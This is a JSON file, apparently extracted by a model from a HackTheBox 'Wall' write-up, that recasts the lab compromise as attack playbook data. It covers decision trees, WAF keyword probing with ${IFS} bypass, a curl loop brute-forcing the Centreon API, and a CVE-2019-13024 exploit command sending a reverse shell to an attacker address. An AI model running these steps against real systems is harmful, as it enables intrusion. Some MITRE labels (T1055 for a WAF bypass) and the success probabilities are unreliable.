@@ -1,0 +1,955 @@
+{
+  "writeup_id": "Htb_Wall",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_waf_bypass_centreon_rce",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+apache",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "http_method_bypass",
+    "privilege_path": "web_rce_to_root",
+    "attack_complexity": "medium",
+    "estimated_time": "90-120 minutes",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "waf_blocking_keywords",
+      "post_method_bypass",
+      "centreon_monitoring_software",
+      "ifs_space_substitution"
+    ],
+    "environmental_clues": [
+      "apache_default_page",
+      "basic_auth_protection",
+      "monitoring_directory",
+      "403_forbidden_responses"
+    ],
+    "similar_scenarios": [
+      "netmon_htb_easy",
+      "sense_htb_easy"
+    ],
+    "unique_aspects": [
+      "get_post_method_discrepancy",
+      "waf_keyword_filtering",
+      "centreon_cve_exploitation",
+      "suid_screen_privilege_escalation"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "HTTP_Method_Bypass",
+        "success_reason": "Webserver only enforced authentication on GET requests, allowing POST to bypass",
+        "prerequisite_indicators": [
+          "basic_auth_prompt_on_get",
+          "web_application_accessible",
+          "misconfigured_apache_directives"
+        ],
+        "recognition_patterns": [
+          "401 on GET, 200 on POST to same endpoint",
+          "authentication bypass via method switching",
+          "inconsistent access controls"
+        ],
+        "failure_modes": [
+          "authentication_required_all_methods",
+          "proper_access_control_configuration",
+          "method_restrictions_in_place"
+        ],
+        "environmental_factors": [
+          "apache_misconfiguration",
+          "incomplete_security_directives",
+          "default_configurations"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-30 minutes"
+      },
+      {
+        "technique": "WAF_Bypass_IFS_Substitution",
+        "success_reason": "WAF blocked space character but allowed ${IFS} environment variable substitution",
+        "prerequisite_indicators": [
+          "command_injection_vulnerability_exists",
+          "waf_blocking_common_payloads",
+          "linux_target_environment"
+        ],
+        "recognition_patterns": [
+          "403 responses on space character",
+          "403 on common command injection keywords",
+          "successful execution with IFS substitution"
+        ],
+        "failure_modes": [
+          "comprehensive_waf_rules",
+          "environment_variable_substitution_blocked",
+          "input_validation_at_application_level"
+        ],
+        "environmental_factors": [
+          "basic_waf_implementation",
+          "keyword_based_filtering",
+          "linux_shell_environment"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "15-45 minutes"
+      },
+      {
+        "technique": "Python_Bytecode_Decompilation",
+        "success_reason": "Compiled Python file contained hardcoded credentials in plaintext",
+        "prerequisite_indicators": [
+          "pyc_files_accessible",
+          "user_home_directory_access",
+          "credentials_stored_in_code"
+        ],
+        "recognition_patterns": [
+          ".pyc files in user directories",
+          "successful decompilation with uncompyle6",
+          "hardcoded passwords in source"
+        ],
+        "failure_modes": [
+          "obfuscated_bytecode",
+          "encrypted_credential_storage",
+          "no_pyc_files_present"
+        ],
+        "environmental_factors": [
+          "developer_workstation",
+          "poor_credential_management",
+          "python_development_environment"
+        ],
+        "success_probability": 0.91,
+        "typical_timeframe": "5-15 minutes"
+      },
+      {
+        "technique": "SUID_Screen_Exploit",
+        "success_reason": "Screen binary had SUID bit set and was vulnerable to privilege escalation",
+        "prerequisite_indicators": [
+          "suid_binaries_present",
+          "vulnerable_screen_version",
+          "user_access_to_execute"
+        ],
+        "recognition_patterns": [
+          "find / -perm -4000 shows screen",
+          "screen version vulnerable to known exploits",
+          "successful root shell execution"
+        ],
+        "failure_modes": [
+          "patched_screen_version",
+          "no_suid_bit_set",
+          "exploit_mitigations_active"
+        ],
+        "environmental_factors": [
+          "legacy_system_configurations",
+          "unnecessary_suid_permissions",
+          "unpatched_software"
+        ],
+        "success_probability": 0.88,
+        "typical_timeframe": "10-20 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "POST method bypasses authentication",
+        "discovery_method": "Manual testing of HTTP methods",
+        "why_critical": "Revealed hidden Centreon installation path",
+        "how_to_recognize": [
+          "401 unauthorized on GET requests",
+          "different response on POST to same endpoint",
+          "redirect or content returned via POST"
+        ],
+        "follow_up_actions": [
+          "test_all_http_methods",
+          "enumerate_discovered_applications",
+          "search_for_known_vulnerabilities"
+        ]
+      },
+      {
+        "discovery": "Centreon CVE-2019-13024 RCE vulnerability",
+        "discovery_method": "Version identification and CVE research",
+        "why_critical": "Direct path to remote code execution",
+        "how_to_recognize": [
+          "centreon version 19.04 identified",
+          "public exploit available",
+          "authentication bypass already achieved"
+        ],
+        "follow_up_actions": [
+          "adapt_exploit_for_waf_bypass",
+          "test_command_injection_payloads",
+          "establish_reverse_shell"
+        ]
+      },
+      {
+        "discovery": "Compiled Python file with credentials",
+        "discovery_method": "File system enumeration in user directory",
+        "why_critical": "Provided lateral movement credentials",
+        "how_to_recognize": [
+          ".pyc files in user home directories",
+          "successful decompilation reveals source",
+          "hardcoded credentials in decompiled code"
+        ],
+        "follow_up_actions": [
+          "decompile_with_uncompyle6",
+          "extract_credentials_from_source",
+          "test_credential_reuse"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "www-data",
+        "escalation_method": "SUID_Screen_Exploitation",
+        "why_possible": "Screen binary had SUID root permissions and known vulnerability",
+        "recognition_signs": [
+          "find_suid_binaries_shows_screen",
+          "vulnerable_screen_version_present",
+          "public_exploits_available"
+        ],
+        "exploitation_path": "SUID enumeration → Screen exploit → Root shell"
+      },
+      {
+        "privilege_level": "user_account",
+        "escalation_method": "Credential_Reuse_SUID_Exploit",
+        "why_possible": "Python bytecode contained reusable credentials for privilege escalation",
+        "recognition_signs": [
+          "pyc_file_decompilation_successful",
+          "hardcoded_credentials_discovered",
+          "same_suid_vulnerability_accessible"
+        ],
+        "exploitation_path": "Bytecode analysis → Credential extraction → User access → SUID exploit"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only ports 22 and 80 open on Linux host",
+        "decision": "Focus on web application enumeration and vulnerability discovery",
+        "reasoning": "Limited attack surface requires thorough web application testing",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_brute_force",
+            "when": "if web enumeration fails"
+          },
+          {
+            "option": "service_version_exploits",
+            "when": "if specific CVEs found"
+          }
+        ],
+        "success_indicators": [
+          "hidden_directories_found",
+          "authentication_bypasses_discovered",
+          "application_frameworks_identified"
+        ],
+        "next_decision": "analyze_web_application_behavior"
+      },
+      {
+        "step": 2,
+        "situation": "Discovered authentication bypass via HTTP method differences",
+        "decision": "Test POST requests against GET-protected resources",
+        "reasoning": "Misconfigured authentication only checking GET requests",
+        "confidence": 0.85,
+        "prerequisites": [
+          "protected_resource_identified",
+          "401_response_on_get"
+        ],
+        "success_indicators": [
+          "post_request_bypasses_auth",
+          "hidden_content_revealed"
+        ],
+        "failure_fallbacks": [
+          "parameter_fuzzing",
+          "header_manipulation",
+          "cookie_analysis"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Found Centreon application requiring authentication",
+        "decision": "Research CVEs and prepare credential attack with token handling",
+        "reasoning": "Known vulnerable application with public exploits available",
+        "confidence": 0.95,
+        "prerequisites": [
+          "application_version_identified",
+          "exploit_code_available"
+        ],
+        "success_indicators": [
+          "cve_exploit_found",
+          "authentication_mechanism_understood"
+        ],
+        "next_decision": "handle_csrf_tokens_during_brute_force"
+      },
+      {
+        "step": 4,
+        "situation": "WAF blocking certain keywords in requests",
+        "decision": "Identify blocked keywords and find bypass techniques",
+        "reasoning": "WAF evasion necessary for successful exploitation",
+        "confidence": 0.8,
+        "alternatives": [
+          {
+            "option": "encoding_bypass",
+            "when": "if simple keyword blocking"
+          },
+          {
+            "option": "environment_variables",
+            "when": "if space_character_blocked"
+          },
+          {
+            "option": "alternative_syntax",
+            "when": "if command_injection_possible"
+          }
+        ],
+        "success_indicators": [
+          "blocked_keywords_identified",
+          "bypass_method_working"
+        ],
+        "failure_fallbacks": [
+          "different_payload_types",
+          "alternative_injection_points"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_auth_bypass_found": {
+        "action": "enumerate_hidden_applications",
+        "tools": [
+          "curl",
+          "burp_suite"
+        ],
+        "next_phase": "application_specific_exploitation"
+      },
+      "if_centreon_discovered": {
+        "action": "research_cve_and_prepare_exploit",
+        "alternatives": [
+          "credential_brute_force",
+          "default_credentials",
+          "cve_exploitation"
+        ],
+        "decision_criteria": "based_on_authentication_requirements"
+      },
+      "if_waf_detected": {
+        "action": "identify_and_bypass_filters",
+        "purpose": "enable_successful_payload_delivery",
+        "tools": [
+          "custom_scripts",
+          "payload_encoding",
+          "environment_variables"
+        ]
+      },
+      "if_credentials_obtained": {
+        "action": "execute_cve_exploit_with_waf_bypass",
+        "purpose": "achieve_remote_code_execution",
+        "tools": [
+          "modified_exploit_scripts",
+          "reverse_shells"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_post_against_get_protected_resources",
+        "reasoning": "common_misconfiguration_in_web_applications",
+        "applicability": "any_401_responses_encountered"
+      },
+      {
+        "rule": "research_application_specific_cves_immediately",
+        "reasoning": "known_applications_often_have_public_exploits",
+        "applicability": "identified_application_frameworks"
+      },
+      {
+        "rule": "test_for_waf_when_getting_403_responses",
+        "reasoning": "blocked_requests_indicate_filtering_mechanisms",
+        "applicability": "unexpected_403_responses_to_normal_requests"
+      },
+      {
+        "rule": "use_environment_variables_for_space_bypass",
+        "reasoning": "IFS_variable_commonly_bypasses_space_filtering",
+        "applicability": "command_injection_with_space_restrictions"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "HTTP Method Bypass",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_server_running",
+          "authentication_configured_for_get_only",
+          "post_requests_allowed"
+        ],
+        "success_indicators": [
+          "401_on_get_200_on_post",
+          "different_response_codes_by_method",
+          "authentication_bypass_achieved"
+        ],
+        "incompatible_with": [
+          "method_based_authentication_consistent",
+          "all_methods_require_auth",
+          "method_not_allowed_responses"
+        ],
+        "confidence_boosters": [
+          "basic_auth_prompt_on_get",
+          "misconfigured_apache_directives",
+          "default_server_configurations"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "WAF Bypass via Environment Variables",
+        "mitre_id": "T1055",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "unix"
+        ],
+        "environmental_prerequisites": [
+          "web_application_firewall_present",
+          "command_injection_vulnerability",
+          "linux_shell_environment"
+        ],
+        "success_indicators": [
+          "403_responses_on_keywords",
+          "space_character_blocked",
+          "ifs_variable_substitution_works"
+        ],
+        "incompatible_with": [
+          "comprehensive_waf_rules",
+          "environment_variable_filtering",
+          "no_command_injection"
+        ],
+        "confidence_boosters": [
+          "specific_keywords_blocked",
+          "hostname_passwd_triggers_403",
+          "linux_target_confirmed"
+        ],
+        "typical_success_rate": 0.78,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "CVE Exploitation - Centreon",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "centreon_software_detected",
+          "vulnerable_centreon_version",
+          "web_interface_accessible"
+        ],
+        "success_indicators": [
+          "centreon_login_page_found",
+          "version_information_available",
+          "rce_payload_execution"
+        ],
+        "incompatible_with": [
+          "patched_centreon_version",
+          "centreon_not_installed",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "centreon_redirect_found",
+          "monitoring_path_discovered",
+          "default_installation_paths"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "SUID Binary Exploitation - Screen",
+        "mitre_id": "T1548.001",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "suid_screen_binary_present",
+          "vulnerable_screen_version",
+          "local_shell_access"
+        ],
+        "success_indicators": [
+          "screen_suid_bit_set",
+          "exploit_payload_works",
+          "root_shell_obtained"
+        ],
+        "incompatible_with": [
+          "patched_screen_version",
+          "no_suid_binaries",
+          "restricted_shell_environment"
+        ],
+        "confidence_boosters": [
+          "find_suid_binaries_reveals_screen",
+          "older_linux_distribution",
+          "default_package_installations"
+        ],
+        "typical_success_rate": 0.92,
+        "estimated_time": "5-15 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application_firewall": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "response_indicators": [
+          "403_on_keywords",
+          "blocked_parameters",
+          "filtered_requests"
+        ],
+        "confidence_threshold": 0.8
+      },
+      "centreon_monitoring": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "path_indicators": [
+          "/centreon",
+          "/monitoring",
+          "/nagios"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "apache_webserver": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "Ubuntu"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "linux_system": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh"
+        ],
+        "banner_indicators": [
+          "OpenSSH",
+          "Ubuntu",
+          "Linux"
+        ],
+        "confidence_threshold": 0.95
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "http_method_bypass",
+          "when": "basic_auth_detected_on_get",
+          "reason": "quick_authentication_bypass_opportunity"
+        },
+        {
+          "attack": "directory_enumeration",
+          "when": "web_server_detected",
+          "reason": "reveals_hidden_paths_and_applications"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "waf_bypass_testing",
+          "when": "403_responses_on_parameters",
+          "reason": "indicates_filterable_waf_present"
+        },
+        {
+          "attack": "centreon_exploitation",
+          "when": "centreon_path_discovered",
+          "reason": "known_cve_exploitation_opportunity"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "credential_bruteforce",
+          "when": "authentication_required",
+          "reason": "time_intensive_low_success_rate"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "HTTP Method Bypass",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -X POST http://{target}/{protected_path}",
+            "actual_command": "curl -X POST http://10.10.10.157/monitoring/",
+            "output_pattern": "redirect to '/centreon'",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "webserver_misconfiguration",
+          "auth_only_on_get_requests"
+        ],
+        "success_indicators": [
+          "access_to_protected_directory",
+          "discovery_of_hidden_applications"
+        ],
+        "common_failures": [
+          "proper_auth_configuration",
+          "method_restrictions_in_place"
+        ],
+        "follow_up_techniques": [
+          "application_enumeration",
+          "credential_brute_force"
+        ],
+        "time_investment": "1-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "WAF Bypass with Environment Variables",
+        "mitre_id": "T1055",
+        "category": "defense_evasion",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -d 'payload_with_${IFS}' {target}",
+            "actual_command": "Modified centreon exploit to use ${IFS} instead of spaces",
+            "output_pattern": "successful command execution",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "waf_blocking_space_character",
+          "linux_target_environment",
+          "command_injection_vulnerability"
+        ],
+        "success_indicators": [
+          "bypass_waf_restrictions",
+          "successful_command_execution"
+        ],
+        "common_failures": [
+          "waf_blocks_environment_variables",
+          "target_not_linux_based"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "privilege_escalation"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Centreon RCE Exploitation",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "centreon-exploit.py",
+            "command_template": "./centreon-exploit.py {url} {username} {password} {lhost} {lport}",
+            "actual_command": "./centreon-exploit.py http://10.10.10.157/centreon/ admin password1 10.10.14.30 443",
+            "output_pattern": "[+] Check you netcat listener !",
+            "effectiveness_rating": 4,
+            "reliability": 0.8
+          }
+        ],
+        "prerequisites": [
+          "centreon_v19.04_installed",
+          "valid_credentials_obtained",
+          "cve_2019_13024_applicable"
+        ],
+        "success_indicators": [
+          "successful_authentication",
+          "payload_injection_completed",
+          "reverse_shell_received"
+        ],
+        "common_failures": [
+          "waf_blocking_payload",
+          "netcat_without_e_flag",
+          "network_connectivity_issues"
+        ],
+        "follow_up_techniques": [
+          "shell_stabilization",
+          "local_enumeration",
+          "privilege_escalation"
+        ],
+        "time_investment": "15-45 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "API-based Credential Brute Force",
+        "mitre_id": "T1110.001",
+        "category": "credential_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -s {target}/api/index.php?action=authenticate -d \"username={user}&password={pass}\"",
+            "actual_command": "curl -s 10.10.10.157/centreon/api/index.php?action=authenticate -d \"username=admin&password=${pass}\"",
+            "output_pattern": "{\"authToken\":\"",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "api_endpoint_accessible",
+          "no_rate_limiting",
+          "weak_password_policy"
+        ],
+        "success_indicators": [
+          "auth_token_returned",
+          "successful_api_authentication"
+        ],
+        "common_failures": [
+          "rate_limiting_enabled",
+          "account_lockout_policies",
+          "strong_passwords_in_use"
+        ],
+        "follow_up_techniques": [
+          "authenticated_api_enumeration",
+          "application_exploitation"
+        ],
+        "time_investment": "1-60 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "curl",
+        "use_case": "http_method_bypass_and_api_brute_force",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "burp_suite",
+          "custom_scripts"
+        ],
+        "best_practices": [
+          "test_all_http_methods_on_protected_resources",
+          "use_api_endpoints_for_faster_brute_force",
+          "implement_proper_error_handling"
+        ]
+      },
+      {
+        "tool": "centreon-exploit.py",
+        "use_case": "centreon_rce_exploitation",
+        "effectiveness_rating": 4,
+        "reliability": 0.75,
+        "learning_curve": "medium",
+        "essential_for": [
+          "centreon_environments"
+        ],
+        "alternatives": [
+          "manual_exploitation",
+          "metasploit_modules"
+        ],
+        "best_practices": [
+          "modify_payload_for_waf_bypass",
+          "add_error_checking_to_script",
+          "test_different_reverse_shell_methods"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "centreon_discovery_to_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl -X POST http://10.10.10.157/monitoring/",
+            "purpose": "Bypass authentication using POST method",
+            "expected_output": "Redirect to /centreon"
+          },
+          {
+            "step": 2,
+            "command": "for pass in $(cat wordlist.txt); do curl -s 10.10.10.157/centreon/api/index.php?action=authenticate -d \"username=admin&password=${pass}\" | grep authToken && echo $pass && break; done",
+            "purpose": "Brute force credentials via API",
+            "expected_output": "Password: password1"
+          },
+          {
+            "step": 3,
+            "command": "./centreon-exploit.py http://10.10.10.157/centreon/ admin password1 10.10.14.30 443",
+            "purpose": "Exploit CVE-2019-13024 for RCE",
+            "expected_output": "Reverse shell as www-data"
+          }
+        ],
+        "success_rate": 0.8,
+        "typical_duration": "30-90 minutes"
+      },
+      {
+        "sequence_name": "waf_bypass_enumeration",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl http://10.10.10.157 -d \"hostname\"",
+            "purpose": "Test for WAF blocked keywords",
+            "expected_output": "403 Forbidden response"
+          },
+          {
+            "step": 2,
+            "command": "wfuzz -c -u http://10.10.10.157/panel.php -d 'FUZZ=test' -w wordlist.txt --hh 26",
+            "purpose": "Identify blocked parameters/keywords",
+            "expected_output": "403 responses for blocked terms"
+          },
+          {
+            "step": 3,
+            "command": "Modify exploit payload to use ${IFS} instead of spaces",
+            "purpose": "Bypass space character filtering",
+            "expected_output": "Successful command execution"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "15-30 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Wall",
+      "difficulty": "Medium",
+      "os": "Linux Ubuntu",
+      "platform": "HackTheBox",
+      "release_date": "2019-09-14",
+      "author": "askar",
+      "estimated_time": "2-3 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "web_application",
+        "cve_exploitation",
+        "waf_bypass"
+      ],
+      "key_vulnerabilities": [
+        "centreon_cve",
+        "authentication_bypass",
+        "suid_screen"
+      ],
+      "environment_type": "web_server_with_monitoring",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "waf_evasion",
+        "http_method_bypass",
+        "python_decompilation",
+        "suid_exploitation"
+      ],
+      "prerequisite_knowledge": [
+        "web_enumeration",
+        "http_methods",
+        "linux_privilege_escalation"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "waf_bypass",
+        "cve_exploitation",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "authentication_bypass",
+        "command_injection",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "proper_http_method_restrictions",
+        "waf_configuration",
+        "suid_binary_auditing"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Networked",
+        "Poison",
+        "Nineveh"
+      ],
+      "similarity_reasons": [
+        "web_exploitation",
+        "waf_bypass_techniques",
+        "multi_stage_exploitation"
+      ],
+      "unique_aspects": [
+        "post_method_bypass",
+        "ifs_space_substitution",
+        "centreon_monitoring"
+      ],
+      "difficulty_factors": [
+        "waf_evasion_required",
+        "multiple_exploitation_stages",
+        "python_decompilation"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T03:18:14.589413",
+    "original_file": "0xdf_writeups/Htb Wall.md",
+    "content_length": 38207,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
